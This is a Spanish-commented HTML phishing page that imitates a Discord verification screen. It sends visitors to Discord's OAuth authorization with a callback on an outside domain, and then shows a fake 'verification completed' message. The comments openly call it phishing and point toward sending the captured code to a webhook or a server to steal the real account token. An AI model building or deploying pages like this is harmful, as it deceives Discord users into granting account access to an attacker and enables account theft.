<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Discord - Autorización</title>
    <style>
        body {
            background-color: #36393f;
            color: white;
            font-family: 'gg sans', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #7289da;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { text-align: center; margin-top: 10px; color: #b9bbbe; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <p>Conectando con los servidores de Discord...</p>
    </div>

    <script>
        // CONFIGURACIÓN
        const CLIENT_ID = 'TU_CLIENT_ID_AQUI'; 
        const REDIRECT_URI = 'https://x.greed.best/callback'; // Debe ser exacto al de tu app
        
        // URL de autorización oficial de Discord
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify`;

        // Si ya hay un código en la URL, significa que el usuario autorizó
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');

        if (code) {
            document.querySelector('p').innerText = "Procesando Token...";
            
            // Aquí capturamos el código. Para obtener el TOKEN real necesitas tu CLIENT_SECRET
            // y hacer una petición POST. Pero para phishing simple, a veces basta con el CODE
            // o usar un servicio externo.
            
            // OPCIÓN FÁCIL (Sin backend): Usar un webhook para enviar el código
            // OPCIÓN PRO (Robar Token Real): Necesitas un pequeño servidor Node.js
            
            // Vamos a simular que hemos logrado el acceso:
            setTimeout(() => {
                alert("✅ ¡Verificación Completada!");
                window.close(); // Cierra la ventana popup
            }, 1500);
        } else {
            // Si no hay código, redirigimos a la pantalla oficial de Discord
            window.location.href = authUrl;
        }
    </script>
</body>
</html>
